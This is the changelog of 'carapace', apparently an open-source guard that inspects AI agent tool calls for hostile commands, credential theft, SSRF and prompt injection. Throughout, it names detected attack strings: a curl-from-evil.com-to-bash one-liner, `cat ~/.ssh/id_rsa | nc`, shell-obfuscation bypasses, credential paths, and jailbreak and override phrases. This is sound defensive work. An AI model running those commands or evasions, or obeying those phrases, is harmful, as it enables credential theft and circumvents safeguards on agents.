# Changelog

All notable changes to this project will be documented in this file.

## [0.10.6] - 2026-04-18

### Fixed
- **ExecGuard**: ReDoS-prone `.*` changed to non-greedy `.*?` in find-delete, Python exec/pty, and Python pickle/marshal/yaml patterns.
- **PathGuard**: ReDoS-prone `.*` changed to `.*?` in Chromium, Firefox, and Safari browser data detection patterns.
- **PathGuard**: `Cookies.binarycookies` pattern narrowed to require `Library/` or `Caches/` prefix, reducing false positives.
- **PromptInjection**: ReDoS-prone `.*` changed to `.*?` in Base64 decode+execute pattern.
- **PromptInjection**: Renamed `CYRILLIC_CONFUSABLES` to `HOMOGLYPH_CONFUSABLES` for broader coverage.
- **Dashboard**: `getPort()` null safety — `typeof addr === "object"` returns true for `null` in JavaScript, now explicitly checked.
- **Dashboard**: `timeSeries()` validates `bucketMs` is positive integer.
- **Dashboard**: GET endpoints (`/api/events`, `/api/stats`, `/api/timeseries`) no longer require auth for embedded dashboard UI.
- **CLI**: Version read wrapped in try/catch for bundled environments where `package.json` is unavailable.
- **NetworkGuard**: Unicode ideographic full stop (U+3002, U+FF61) normalized to `.` in URL decoding per WHATWG spec.

### Added
- **ExecGuard**: `find / -delete` destructive operation detection (critical).
- **ExecGuard**: `launchctl load/submit` macOS persistence detection (high).
- **ExecGuard**: `setcap` Linux capabilities privilege escalation (critical).
- **ExecGuard**: `install -m SUID/SGID` bit setting detection (critical).
- **ExecGuard**: `LD_PRELOAD`/`LD_LIBRARY_PATH` injection detection (high).
- **ExecGuard**: `/etc/ld.so.preload` system-level persistence detection (critical).
- **ExecGuard**: `DYLD_INSERT_LIBRARIES` macOS library injection detection (high).
- **ExecGuard**: Python pickle/marshal/yaml deserialization RCE detection (critical).
- **ExecGuard**: `update-alternatives` interpreter replacement backdoor detection (critical).
- **ExecGuard**: Windows LOLBins — `mshta`, `regsvr32`, `msiexec` remote execution (critical).
- **PathGuard**: Chromium-family browsers expanded (Brave, Edge, Opera, Vivaldi).
- **PathGuard**: macOS `Cookies.binarycookies`, `/etc/master.passwd`, TCC.db detection.
- **PathGuard**: Windows Credential Manager vault access detection.
- **PathGuard**: AWS SSO cache token, Alibaba/Tencent/Huawei cloud credential detection.
- **PathGuard**: Terraform tfstate, `.htpasswd`, WireGuard/OpenVPN config detection.
- **PathGuard**: Solana and Monero crypto wallet access detection.
- **PathGuard**: GitLab Runner and GitHub CLI credential access detection.
- **NetworkGuard**: `file://` scheme SSRF and DNS rebinding domain detection.
- **NetworkGuard**: OOB interaction services expanded (burpcollaborator.net, canarytokens.com, requestrepo.com).
- **DataExfil**: sftp credential exfiltration detection.
- **DataExfil**: `curl --json @file` upload detection.
- **DataExfil**: `/dev/udp` exfiltration (extending `/dev/tcp` coverage).
- **DataExfil**: Hex encoding credential exfiltration via xxd/hexdump/od.
- **DataExfil**: docker/kube credential paths added to scp/rsync/sftp patterns.
- **PromptInjection**: Japanese language injection patterns (指示覆盖, システムプロンプト泄漏).
- **PromptInjection**: Korean language injection patterns (지시 무시, 시스템 프롬프트 泄漏).
- **PromptInjection**: Greek and Armenian homoglyph normalization (17 additional confusable characters).
- **PromptInjection**: Base64 decode+execute long-string jailbreak detection.
- 55 new tests (1734 total).

## [0.10.5] - 2026-04-15

### Fixed
- **ExecGuard**: `${x:=val}` assignment expansion bypass — now extracts value for pattern matching.
- **ExecGuard**: `$@`/`$*`/`$_` special variable bypass — now stripped during normalization.
- **ExecGuard**: `rm -rf /path` false positive — split into critical (bare `/` and `/*`) and high (other absolute paths).
- **ExecGuard**: Added `execute_code`/`executeCode` to recognized exec tool names.
- **ExecGuard**: Output process substitution (`> >(bash)`) bypass — now detected as RCE.
- **ExecGuard**: Mixed short+long `rm` flags (`-r --force`) bypass — all combinations now detected.
- **ExecGuard**: `rm --no-preserve-root` bypass — now detected as critical.
- **ExecGuard**: `${IFS:0:1}` and other IFS substring variants — now normalized to space.
- **ExecGuard**: Heredoc pattern no longer requires trailing newline.
- **ExecGuard**: Bare newline command separation — normalized to semicolons for pattern matching.
- **ExecGuard**: Added `eval` to recognized exec tool names.
- **ExecGuard**: Added `mksh`/`pwsh` to shell lists in RCE patterns.
- **PromptInjection**: Cyrillic homoglyph bypass — 22 confusable characters now normalized to Latin equivalents.
- **DataExfil**: Pipe exfiltration patterns expanded from `cat`-only to 11 file-reading commands.
- **DataExfil**: Fixed `let` to `const` for never-reassigned variable.
- **NetworkGuard**: Short-form loopback IPs (`127.1`, `127.0.1`) and bare zero (`http://0`) now detected.
- **Dashboard**: GET API endpoints now require auth when `apiToken` is configured.
- **Dashboard**: Server error handler during listen now properly cleans up server instance.
- **Tailer**: Fixed potential infinite recursion and improved UTF-8 boundary tracking in session log tailer.
- **LangChain adapter**: Added CSRF protection via Content-Type enforcement on POST requests.
- **LangChain adapter**: Added `typeof` check for `toolName` field validation.
- **CI**: Added npm caching to `actions/setup-node` steps and updated `docker/build-push-action` to v6.
- **Docs**: Updated stale pattern counts across README and DESIGN docs.

### Added
- 7 new DataExfil credential patterns: GitLab PAT, NPM, PyPI, HuggingFace, SendGrid, DigitalOcean, HashiCorp Vault.
- 6 new PathGuard sensitive paths: Heroku, Stripe, DigitalOcean CLI, Hub, 1Password, Teleport SSH.
- 2 new NetworkGuard patterns: Tencent Cloud metadata, DNS wildcard metadata bypass.
- 40 new tests covering all above fixes (1679 total).

## [0.10.3] - 2026-04-06

### Fixed
- **NetworkGuard**: Protocol-relative URLs (`//evil.com`) now extracted and scanned (previously required explicit scheme).
- **NetworkGuard**: Decimal/octal/hex encoded IP rules now cover all protocols (gopher, ldap, telnet, etc.), matching dotted-IP rule.
- **NetworkGuard**: Null bytes stripped in `fullyDecodeURI` to prevent domain-splitting bypass.
- **PathGuard**: `safeRegexTest` uses overlapping sliding windows instead of head+tail sampling, fixing mid-string bypass for inputs >4096 chars.
- **PathGuard**: KeePass `.kdb`/`.kdbx` pattern now requires path separator anchor, reducing false positives on unrelated `.kdb` files.
- **ExecGuard**: `isExecTool` now normalizes camelCase tool names (`runCommand` → `run_command`) and recognizes `runner`/`executor` suffixes.
- **ExecGuard**: ANSI-C `$'...'` decoder now handles `\uHHHH` and `\UHHHHHHHH` Unicode escapes, with safe handling of surrogates and invalid codepoints.
- **DataExfil**: `extractAllStrings` uses overlapping sliding windows for long strings, fixing mid-string credential bypass.
- **YamlRule**: Custom YAML rules now apply NFKC normalization and invisible character stripping before pattern matching, consistent with built-in rules.
- **MCP adapter**: `interceptResponse` scan threshold lowered from 50 to 16 chars to catch short credentials.
- **Dashboard**: `PolicyManager.resolvePolicy` now returns a defensive copy of `trustedSkills` to prevent shared reference mutation.
- **package.json**: All packages now place `types` before `import` in conditional exports for correct TypeScript resolution.
- **DESIGN docs**: Removed claims for unimplemented features (ML, SOC2/ISO27001, SSO/RBAC, email/SMS, trust score visualization).
- **DESIGN docs**: Fixed rule names `RateGuard` → `RateLimiter`, `BaselineGuard` → `BaselineDrift` to match source code.

### Added
- 23 new tests covering all security bypass fixes (1599 total).

## [0.10.2] - 2026-04-04

### Added
- **ExecGuard**: GPG secret key export (`gpg --export-secret-keys`) detection.
- **ExecGuard**: macOS `security` command (`find-generic-password`, `find-internet-password`, `dump-keychain`) detection.
- **ExecGuard**: Python HTTP server (`python3 -m http.server`) detection.
- **ExecGuard**: `setfacl` ACL permission modification detection.
- **ExecGuard**: Firewall rule modification (`iptables`, `ip6tables`, `nftables`, `nft`) detection.
- **ExecGuard**: `chattr +i` immutable flag detection.
- **ExecGuard**: `mount -o` filesystem mount detection.
- **ExecGuard**: Windows `certutil` LOLBin download/encode detection.
- **PathGuard**: Docker Swarm secrets (`/run/secrets/`) detection.
- **PathGuard**: SSL private key directory (`/etc/ssl/private/`) detection.
- **PathGuard**: FileZilla saved passwords detection.
- **PathGuard**: WinSCP session data detection.
- **PathGuard**: HashiCorp Consul/Nomad token detection.
- **PathGuard**: GNOME keyring (`~/.local/share/keyrings/`) detection.
- **PathGuard**: KeePass database (`.kdbx`/`.kdb`) detection.
- **PathGuard**: macOS security preferences plist detection.
- **NetworkGuard**: Azure Instance Metadata Service (`metadata.azure.com`) detection.
- **NetworkGuard**: Oracle Cloud metadata (`metadata.oraclecloud.com`) detection.
- **NetworkGuard**: DigitalOcean metadata (`metadata.internal`) detection.
- **NetworkGuard**: Kubernetes API internal access (`kubernetes.default.svc`) detection.
- **NetworkGuard**: IPv4-compatible IPv6 metadata bypass (`[::169.254.169.254]`) detection.
- **NetworkGuard**: Additional paste services (`paste.mozilla.org`, `cl1p.net`, `controlc.com`) detection.
- **NetworkGuard**: Additional tunnel services (`playit.gg`, `telebit.cloud`, `remote.it`, `portmap.io`) detection.
- **DataExfil**: `curl -T` upload detection.
- **DataExfil**: `ftp` command data transfer detection.
- **DataExfil**: Telegram Bot API exfiltration detection.
- **DataExfil**: Discord webhook exfiltration detection.
- **DataExfil**: `rclone` cloud transfer detection.
- **DataExfil**: GPG secret key export piped to network tool detection.
- **PromptInjection**: Expanded instruction override verbs (`skip`, `drop`, `abandon`, `dismiss`, `set aside`).
- **PromptInjection**: Added `ignore your safety guidelines` direct safety bypass detection.
- **PromptInjection**: Expanded system prompt leak verbs (`dump`, `echo`, `share`, `paste`, `extract`, `copy`, `write out`, `give me`, `show me`).
- **PromptInjection**: Fixed `what is your system prompt` detection (`is` was missing from `are|were`).
- **PromptInjection**: Added role redefinition synonyms (`pretend`, `imagine`, `suppose`, `roleplay`, `from now on`, `behave like`).
- **PromptInjection**: Expanded jailbreak bypass verbs (`circumvent`, `evade`, `deactivate`, `neutralize`, `sidestep`).
- **PromptInjection**: Added `jailbreak`, `unrestricted`, `unfiltered` to privilege mode detection.
- **PromptInjection**: Fixed `bypass all safety` quantifier gap (`all`/`every`/`the` now accepted).
- **PromptInjection**: Expanded negation forms (`never`, `stop following/obeying`, `no longer`, `should/must not`).
- **PromptInjection**: Expanded LLM special tokens (`assistant`, `user`, `human`, `eot_id`, `end_of_turn`, etc.).
- **PromptInjection**: Added Llama `[INST]`/`[/INST]` marker detection.
- **PromptInjection**: Added JSON `"role": "system"/"assistant"` injection detection.
- **PromptInjection**: Expanded new instruction adjectives (`updated`, `revised`, `replacement`, `override`, `modified`) and delimiters (`:` and `-`).
- **Tailer**: Added comprehensive test suite for `SessionLogTailer` (21 tests including file truncation/rotation).
- **PromptInjection**: Added tests for DAN jailbreak, Chinese patterns, encoding bypass, indirect injection markers, and primary negation patterns (14 tests).

### Fixed
- **Tailer**: Fixed multi-byte UTF-8 offset tracking — CJK/emoji characters caused incorrect byte offsets, corrupting subsequent reads.
- **Tailer**: Fixed oversized line livelock — single JSONL lines exceeding 10MB cap now skip forward instead of re-reading infinitely.
- **Tailer**: File offset eviction now skips the current file to prevent re-reading from offset 0.
- **Tailer**: Malformed JSON lines now log to stderr instead of being silently swallowed.
- **Tailer**: `stop()` now clears `pendingReads` to prevent blocked restarts.
- **PromptInjection**: `act as/like` pattern now requires an article (`a`, `an`, `my`, `the`) to reduce false positives on phrases like "act as expected".
- **PromptInjection**: System prompt leak pattern no longer matches bare "instructions" without qualifier (e.g., "print instructions for the user").
- **PromptInjection**: `DAN` jailbreak pattern now limits `.{0,30}` proximity to reduce false matches on distant word combinations.
- **DataExfil**: Removed unnecessary case-insensitive flag from AWS, Google API Key, and Slack Token patterns to reduce false positives.
- **DataExfil**: Added `xoxr` to Slack token type detection (`xox[bpsar]`).
- **ExecGuard**: Download-then-execute pattern now uses non-greedy `.*?` to support multi-flag curl/wget commands (e.g., `curl -sL url -o file`) and anchors backreference with `(?=\s|$)` to prevent partial filename matches.
- **SIEM sinks**: Splunk, Elastic, and Datadog sinks now consume response body on success to prevent connection pool leaks.
- **adapter-openclaw**: Version aligned from 0.9.0 to 0.10.1 to match all other packages.

## [0.10.1] - 2026-04-01

### Fixed
- **ExecGuard**: Multi-char shell quote bypass — `'cu''rl'` and `"cu""rl"` evasion now normalized before pattern matching.
- **ExecGuard**: `env` prefix bypass — `env -i bash -c` now detected regardless of flags before the interpreter name.
- **PathGuard**: `/proc/[PID]/environ` bypass — pattern now matches any PID, not just `/proc/self/`.
- **LangChain adapter**: `trustedSkills` validation uses `Array.isArray()` to reject non-array values (matching MCP adapter).
- **CLI `skills`**: Removed misleading hardcoded trust score column (`"1.0"` for all skills).
- **CLI `demo`**: Server now stopped in `finally` block to prevent resource leak on injection error.
- **Store `timeSeries`**: `bucketMs` floored to integer to prevent fractional SQLite bucketing.
- **ExecGuard**: `rm` destructive pattern bypass via extra flags between `rm` and `-rf` (e.g., `rm --verbose -rf /`).
- **ExecGuard**: Shell quoting normalization — strip empty quotes (`""`, `''`) and backslash-escaped alphanumerics to prevent evasion.
- **ExecGuard**: `computer_use`, `execute_command`, `run_code`, `code_execution` added to recognized exec tool names.
- **ExecGuard**: Download-then-execute pattern now detects `-o` before URL (e.g., `curl -o /tmp/x URL && bash /tmp/x`) and `&&` separators.
- **ExecGuard**: Interpreter flag-ordering bypass — `python3 -u -c`, `ruby -w -e`, `perl -w -e`, `node --inspect -e`, `php -d val -r` now detected regardless of extra flags before execution flag.
- **ExecGuard**: `nc -c` reverse shell variant (BSD netcat) now detected alongside `-e`/`--exec`.
- **ExecGuard**: Added `unshare` namespace escape and `pkexec` privilege escalation detection.
- **ExecGuard**: Added `tee` persistence patterns for authorized_keys and shell config injection.
- **ExecGuard**: Docker `--volume` long form now detected alongside `-v`.
- **ExecGuard**: Expanded Ruby detection to `system()`/`exec()`/`IO.popen()` and PHP detection to `system()`/`exec()`/`shell_exec()`/`passthru()`/`popen()`.
- **ExecGuard**: `chmod u=rxs` (equals operator) and `chmod 3xxx`/`5xxx` (sticky+S[UG]ID) now detected.
- **ExecGuard**: Added heredoc `<<` injection detection (`bash <<EOF`, `cat <<EOF | bash`).
- **ExecGuard**: Shell variable expansion bypass — `$C$U$R$L` evasion now normalized before pattern matching.
- **ExecGuard**: Non-empty shell quotes bypass — `c'u'r'l'` evasion now normalized before pattern matching.
- **ExecGuard**: `$IFS` variable manipulation bypass — `curl${IFS}` now normalized to space before matching.
- **ExecGuard**: ANSI-C quoting bypass — `$'\x63\x75\x72\x6c'` (hex) and `$'\143\165\162\154'` (octal) now decoded before matching.
- **PromptInjection**: Non-breaking space (U+00A0) and other exotic whitespace now normalized to ASCII space.
- **PromptInjection**: Parameter keys now scanned for injections (not just values).
- **Dashboard**: Auth token comparison uses constant-time `crypto.timingSafeEqual()` to prevent timing attacks.
- **Redaction**: Added `Basic` auth pattern and lowered minimum token length from 32 to 16 chars.
- **LangChain adapter**: Fixed `typeof null === "object"` bypass in toolParams validation.
- **OpenClaw tailer**: Malformed JSON parse errors now logged instead of silently swallowed.
- **PathGuard**: Malformed percent-encoding bypass — `%zz` before encoded payload no longer aborts all URL decoding.
- **PathGuard**: Added `/proc/self/environ`, `/proc/self/mem`, `/proc/self/cmdline` detection.
- **NetworkGuard**: Added `gopher://`, `ldap://`, `dict://`, `sftp://`, `telnet://`, `tftp://` scheme extraction to prevent SSRF bypass.
- **NetworkGuard**: Malformed percent-encoding bypass — same fix as PathGuard, individual `%XX` sequence decoding on failure.
- **NetworkGuard**: Added NFKC Unicode normalization to prevent fullwidth character domain bypass.
- **NetworkGuard**: Added IPv6 hex metadata patterns (`[::ffff:a9fe:a9fe]`, `[0:0:0:0:0:ffff:a9fe:a9fe]`).
- **NetworkGuard**: Added decimal/octal/hex IP encoding detection for arbitrary C2 IPs (not just metadata endpoints).
- **DataExfil**: Base64 detection threshold lowered from 200 to 40 characters to catch encoded API keys/tokens (~60 chars).
- **DataExfil**: Added Slack token (`xoxb-`/`xoxp-`/`xoxa-`/`xoxs-`) and OpenSSH private key detection patterns.
- **Dashboard**: Added `apiToken` config for Bearer token authentication on mutation endpoints (POST/PUT/DELETE).
- **MCP adapter**: `trustedSkills` config uses `Array.isArray()` to reject non-array values that bypass the length check.
- **CLI `parsePort`**: Replaced `process.exit(1)` with thrown error to allow proper cleanup via `finally` blocks.
- **CLI `skills`**: Replaced O(S×N) algorithm with single-pass O(N) aggregation.
- **ExecGuard**: `${x:-cmd}` parameter expansion bypass — `${x:-curl} http://evil.com | ${x:-bash}` now decoded before pattern matching.
- **ExecGuard**: Python `exec()`/`compile()`/`pty.spawn()` inline execution now detected.
- **ExecGuard**: `openssl s_client -connect` reverse shell now detected.
- **ExecGuard**: `diff`/`comm`/`join`/`paste`/`cut` reading SSH/AWS credential files now detected.
- **NetworkGuard**: Mixed hex/decimal IP encoding bypass (`http://0xa9.254.0xa9.254/`) now detected.
- **NetworkGuard**: Fully expanded IPv6-mapped address with dotted-decimal IPv4 now detected.
- **DataExfil**: `wget --post-file` exfiltration now detected.
- **DataExfil**: `nc`/`ncat` redirect from credential paths (`.ssh/`, `.aws/`) now detected.
- **DataExfil**: `cat ~/.ssh/id_rsa | nc` credential pipe exfiltration now detected.
- **PathGuard**: `/proc/<PID>/root/` filesystem traversal bypass now detected.
- **ExecGuard**: `crontab -l` (read-only listing) no longer triggers false positive; only edit/remove/install operations flagged.
- **PathGuard**: `.env` pattern broadened to match all `.env.*` variants (`.env.test`, `.env.ci`, `.env.docker`, etc.).
- **PathGuard**: Added detection for `.pgpass`, `.my.cnf`, `.vault-token`, Terraform credentials, GitHub CLI token, `.pypirc`, `.gem/credentials`.
- **DataExfil**: Added `wget --body-file` upload detection.
- **DataExfil**: `hasSendAction` regex now detects `curl -d@file` and `curl -F@file` (no space after flag).
- **Dashboard**: `alertCount` in EventStore now uses explicit `action === "alert"` check (matching core MemoryBackend behavior).
- **CLI `demo`**: Severity color mapping now uses shared `severityColor()` utility for consistency.
- **CLI `loadConfig`**: Parse errors now logged to stderr instead of silently swallowed.
- **ExecGuard**: Perl `-e` detection expanded from `socket()` only to include `system()`, `exec()`, and `open(|)`.
- **ExecGuard**: Added Deno (`deno eval/run`) and Bun (`bun -e/eval/run`) runtime detection; both added to EXEC_TOOL_NAMES.
- **ExecGuard**: Added Lua inline execution detection (`lua -e os.execute/io.popen/os.remove`).
- **PathGuard**: Added `/proc/PID/fd`, `/proc/PID/maps`, `/proc/PID/smaps`, `/proc/PID/status`, `/proc/PID/stat`, `/proc/PID/io`, `/proc/PID/net` info leak detection.
- **PathGuard**: Added `.gradle/gradle.properties` and `.m2/settings.xml` Java ecosystem credential detection.
- **NetworkGuard**: Added `localhost`, `127.x.x.x`, `0.0.0.0` and `[::1]` loopback SSRF detection.
- **DataExfil**: Added `scp` credential file exfiltration detection (`.ssh/`, `.aws/`, `.gnupg/`, `.config/gcloud/`).
- **ExecGuard**: Added `zip` credential archiving detection (`.ssh/`, `.aws/`) alongside existing `tar` detection.
- **ExecGuard**: Added `find -exec` and `find -name` credential discovery detection (scanning for `id_rsa`, `id_ed25519`, `credentials`, `authorized_keys`).
- **DataExfil**: Added `tar/zip` pipe to `curl/wget/nc` credential exfiltration detection.
- **NetworkGuard**: Fixed mixed octal/decimal IP bypass — `http://0300.250.0001.0001` (mixing octal and decimal octets) now detected. Pattern allows optional leading `0` on non-first octets.
- **ExecGuard**: Null byte injection bypass — `cur\x00l | bash` now detected. Added null byte stripping to `normalizeCommand()` (consistent with PathGuard).
- **ExecGuard**: Added `at` scheduler and `screen`/`tmux` detached execution detection.
- **ExecGuard**: Added `rev | sh` string reversal execution detection.
- **ExecGuard**: Added `xxd -r | bash` hex decode execution detection.
- **PathGuard**: Added Kubernetes ServiceAccount token (`/var/run/secrets/kubernetes.io/`) detection.
- **PathGuard**: Added Cargo registry credentials (`.cargo/credentials`) detection.
- **NetworkGuard**: Added AWS ECS task metadata endpoint (`169.254.170.2`) detection.
- **DataExfil**: Added `rsync` credential exfiltration detection.
- **DataExfil**: Added `/dev/tcp` data exfiltration detection.
- **DataExfil**: Added 4 new exfil destination domains: `ix.io`, `sprunge.us`, `termbin.com`, `oastify.com`.

### Changed
- ExecGuard pattern count: 73 → 88 (parameter expansion, exec/pty, openssl, diff/tool credential read, perl system/exec, deno/bun runtime, lua execution).
- PathGuard pattern count: 20 → 33 (/proc/PID/root traversal, database credentials, cloud/DevOps tokens, package registry credentials, /proc info leak, Java ecosystem credentials).
- NetworkGuard categories: 12 → 15 (mixed hex/decimal IP encoding, expanded IPv6 metadata, localhost/loopback SSRF).
- DataExfil pattern count: 20 → 28 (wget --post-file, wget --body-file, nc redirect, credential path pipe, scp credential exfiltration, tar/zip pipe exfil).
- New tests: 1473 total (+56 new: perl system/exec, deno/bun, lua, /proc info leak, gradle/maven, localhost SSRF, scp exfil, zip cred archive, find cred discovery, tar pipe exfil, mixed octal/decimal IP, null byte bypass).

## [0.9.0] - 2026-03-29

### Added
- **ExecGuard**: Busybox shell wrapper detection (`curl | busybox sh`, `busybox wget | sh`).
- **ExecGuard**: Python inline scripting detection (`python -c` with `os.system`, `subprocess`, `urllib`).
- **ExecGuard**: `env` prefix detection for interpreter invocations bypassing restricted PATH.
- **ExecGuard**: Nested object walking in `extractCommand` to detect commands in `{ config: { command: "..." } }`.
- **ExecGuard**: Semicolon/`&&`/`||` newline normalization for multi-command analysis.
- **AlertRouter**: Critical-severity alerts now bypass dismissal (only `blocked` events were previously exempt).
- **SqliteBackend**: `addSession` uses `INSERT OR REPLACE` to match MemoryBackend upsert semantics on duplicate `sessionId`.
- **SqliteBackend**: `addEvent` uses `INSERT OR IGNORE` to gracefully handle duplicate event IDs.
- **SqliteBackend**: `close()` now awaits pending `initialize()` to prevent leaked database handles.
- **MemoryBackend**: `updateSession` strips `sessionId` from updates to prevent map key corruption.
- **MCP adapter**: Non-JSON stdin lines are now dropped instead of forwarded unvalidated to child process.
- **OpenClaw tailer**: File offset eviction now excludes the current file to prevent duplicate event reads.
- New tests: busybox/python inline, nested params, env prefix, dismissal critical bypass, store sessionId protection, CLI parseArgs (1234 total).

### Fixed
- **CLI parseArgs**: Long flags (`--severity`) now correctly reject short flags (`-v`) as values, matching short-flag behavior.
- **CLI commands**: `process.exit(1)` in dismiss/events/report/skills no longer bypasses `finally` block, ensuring SQLite store is always closed.
- **Demo SSE broadcast**: Demo events now use the dashboard sink instead of direct `store.add()`, enabling real-time SSE updates.
- **CI Docker tags**: Updated from 0.8.0 to 0.9.0 in GitHub Actions workflow.

### Changed
- All package versions bumped to 0.9.0.
- ExecGuard pattern count: 60 → 67.

## [0.8.0] - 2026-03-27

### Added
- **SQLite store**: persist `matchedPattern` and `toolParams` fields through storage round-trips.
- **ReDoS validator**: `isRedosSafe()` utility for user-supplied regex patterns.
- **SIEM SSRF tests**: 10 tests for Splunk, Elastic, Datadog, Syslog sink URL validation.
- **`.dockerignore`** for faster Docker builds.
- New tests: store round-trip, YAML malformed input, policy import validation, exec-guard flag variants, network-guard false positives (933 total).

### Fixed
- **ExecGuard**: `rm -fr /`, `rm -r -f /`, `rm --force --recursive /` now detected (flag reordering).
- **NetworkGuard**: Mining pool regex reduced false positives (`pool.ntp.com`, `mining.engineering` no longer trigger).
- **YAML rule loader**: malformed `match.params` and `match.any_param` no longer crash at runtime.
- **Dashboard policy import**: validates JSON structure before iterating; skips entries without name.
- **Dashboard ruleName parameter**: length-limited to 200 chars.
- **EventStore/MemoryBackend getStats**: merged double `.reduce()` into single loop.
- **SyslogSink**: UDP send now properly awaits callback to prevent socket leaks.
- **CLI events**: `--severity` validated against known values; `--limit` rejects NaN/negative.
- **CLI scan**: store resource leak fixed with try/finally.
- **CLI parseArgs**: short flags now accept negative number values.
- **LangChain adapter**: log alert send failures instead of silent catch; `stop()` closes active connections.
- **Tailer**: read buffer capped at 10MB to prevent OOM.
- **Dockerfile**: healthcheck fallback removed (was masking failures); `npm prune` stderr no longer suppressed.
- **README**: aspirational features (role-based access, policy versioning, audit logging) marked as planned.

### Changed
- All package versions bumped to 0.8.0.

## [0.7.0] - 2026-03-14

### Added
- **`carapace init` command**: Auto-detect AI framework from package.json (OpenClaw, LangChain, CrewAI, AutoGen, MCP) and generate `.carapace.yml` config file.
- **`carapace setup` wizard**: Interactive 5-step configuration wizard for blocking policy, webhook URL, baseline learning, and rate limit.
- **Dockerfile**: Multi-stage Alpine-based Docker image for `carapace scan`.
- **GitHub Action** (`action.yml`): Reusable composite action for CI security scanning.
- **CI workflows**: `ci.yml` (lint, test, Docker build) and `carapace-scan.yml` (security audit).
- **New test suites**: init/setup command tests, error recovery tests, integration tests, MCP edge case tests, advanced policy tests (933 total).
- Webhook retry with exponential backoff (500ms × 2^attempt, max 2 retries).
- MCP proxy stdin buffer size limit (10MB) to prevent memory exhaustion.
- Rate limiter session map cleanup with LRU eviction at 10K cap.

### Fixed
- ReDoS vulnerability in data-exfil base64 regex — capped quantifier to `{200,2000}`.
- Path guard ReDoS — added `safeRegexTest` with 4096-char input truncation.
- Engine `blockReason` tracking with separate `highestBlockSeverity` variable.
- Store `timeRange` min/max initial values (was `events[0].timestamp`, now `MAX_SAFE_INTEGER`/`0`).
- SQLite test detection — now validates native binding loads, not just module resolution.

### Changed
- README: added Mermaid architecture diagrams, feature mindmap, sequence diagram, CLI quick reference.
- All package versions bumped to 0.7.0.

## [0.6.0] - 2026-03-11

### Added
- **SQLite persistent storage** (`StorageBackend`): Abstract storage backend with `MemoryBackend` (in-memory, default) and `SqliteBackend` (optional, via `better-sqlite3`). Schema: events, sessions, skill_baselines tables with indexes. Factory `createStore()` auto-detects backend availability.
- **CLI tool** (`@carapace/cli`): Full command-line interface — `carapace status`, `config`, `events` (with filters/CSV export), `skills`, `trust/untrust`, `scan`, `report`, `baseline`, `dismiss/dismissals`. Lightweight arg parser, ANSI colors, zero external CLI deps.
- **Alert escalation** (`AlertEscalation`): Repeated events auto-upgrade severity. 3+ in 10 min → severity +1 level; 10+ → forced CRITICAL. Configurable window/thresholds.
- **HookMessage Sink** (`HookMessageSink`): Inject security alerts directly into agent conversation. Configurable minimum severity (default: high). Icons for blocked (🛡️) vs alert (⚠️).
- **False positive dismissal** (`DismissalManager`): Pattern-based event dismissal with optional expiration. Match by rule, tool, skill name. Integrated into AlertRouter pipeline.
- **First-run report**: OpenClaw adapter generates per-skill first-run reports on session end — tools used, files accessed, domains contacted, commands executed.
- **`gateway_stop` hook**: Graceful shutdown — flushes session stats, cleans up timers, logs summary on exit.
- New test suites: 44 alerter tests, 34 store tests, 32 CLI tests (367 total across all packages).

### Changed
- Monorepo expanded to 6 packages: core + 3 adapters + dashboard + CLI.
- `AlertRouter` now accepts optional config for escalation and dismissal features.
- All package versions bumped to 0.6.0.
- Root build/test scripts updated for CLI package.
- **Open source strategy**: Removed Pro/Enterprise commercial tier distinctions. All features (Dashboard, SIEM, Policy Management, ML detection, compliance reporting) are now free and open source under MIT license.

## [0.5.0] - 2026-03-11

### Added
- **Dashboard Web UI** (`@carapace/dashboard`): Real-time security monitoring dashboard with embedded dark-theme HTML interface, SSE live event push, and comprehensive REST API (`/api/events`, `/api/stats`, `/api/timeseries`, `/api/policies`, `/api/health`).
- **EventStore**: In-memory event database with query filters (category, severity, rule, session, time range), pagination, statistics aggregation, and time series bucketing. Configurable max capacity with automatic eviction.
- **SIEM connectors**: 4 enterprise connectors — Splunk HEC (`SplunkSink`), Elasticsearch bulk API (`ElasticSink`), Datadog Logs API (`DatadogSink`), and Syslog RFC 5424 (`SyslogSink`) with UDP/TCP support.
- **Team policy management** (`PolicyManager`): Multi-policy CRUD with inheritance chains, circular dependency detection, override merging (forceBlock, disabledRules, additionalTrustedSkills), JSON import/export, and 3 preset templates (permissive, standard, strict).
- New test suite: 28 dashboard tests (257 total across all packages).

### Changed
- Monorepo expanded to 5 packages: core + 3 adapters + dashboard.
- All package versions bumped to 0.5.0.
- Root build/test scripts updated for dashboard package.

## [0.4.0] - 2026-03-11

### Added
- **YAML custom rules**: Define security rules via YAML files without writing TypeScript. Supports tool name matching, parameter pattern matching, and any-parameter scanning. Multi-document YAML supported.
- **MCP proxy adapter** (`@carapace/adapter-mcp`): Transparent stdio proxy for MCP (Model Context Protocol) servers. Intercepts `tools/call` requests, applies all security rules, and returns JSON-RPC errors for blocked calls. Includes response data-exfil scanning.
- **LangChain/CrewAI Python bridge** (`@carapace/adapter-langchain`): HTTP bridge server for Python agent frameworks. Exposes `/check`, `/check/batch`, `/status`, and `/health` endpoints. Includes Python client library example.
- New test suites: 12 YAML rule tests, 12 MCP proxy tests, 12 bridge tests (229 total).

### Changed
- Monorepo expanded: 4 packages (core + 3 adapters).
- Root build/test scripts updated for all packages.
- Both adapters support YAML custom rule loading via `yamlRules` config option.

## [0.3.0] - 2026-03-11

### Added
- **PromptInjection rule**: 19 patterns detecting prompt injection attempts in tool parameters — role overrides, system prompt leaks, jailbreak attempts (DAN, developer mode), encoding bypasses, fake system tags, and indirect injection markers.
- **DataExfil rule**: 14+ patterns detecting data exfiltration — credential leaks (AWS keys, GitHub tokens, OpenAI/Stripe keys, private keys), file uploads via curl, environment variable leaks, pipe exfil patterns. 12 known exfil destination services (transfer.sh, file.io, ngrok, webhook.site, etc.).
- **BaselineDrift rule**: Per-skill behavior baseline modeling with configurable learning threshold (default 20 calls). Detects novel tool usage after learning phase completes.
- **Session statistics**: Per-session counters tracking tool calls, blocked calls, and alerts fired, with summary logged on session end.
- **Response data-exfil scanning**: `after_tool_call` hook now scans tool results for credential leak patterns.

### Changed
- Adapter now registers 5 always-on rules (ExecGuard, PathGuard, NetworkGuard, PromptInjection, DataExfil) plus optional RateLimiter and BaselineDrift.
- Adapter version string updated to v0.3.0.
- Configuration expanded: `enableBaseline` (boolean), `maxToolCallsPerMinute` (number).
- Test suite expanded from 161 to 195 tests.

## [0.2.0] - 2026-03-11

### Added
- **RateLimiter rule**: Sliding-window rate limiting per session, configurable via `maxToolCallsPerMinute`. Triggers medium/high/critical alerts based on how far the rate exceeds the threshold (1x/1.5x/2x).
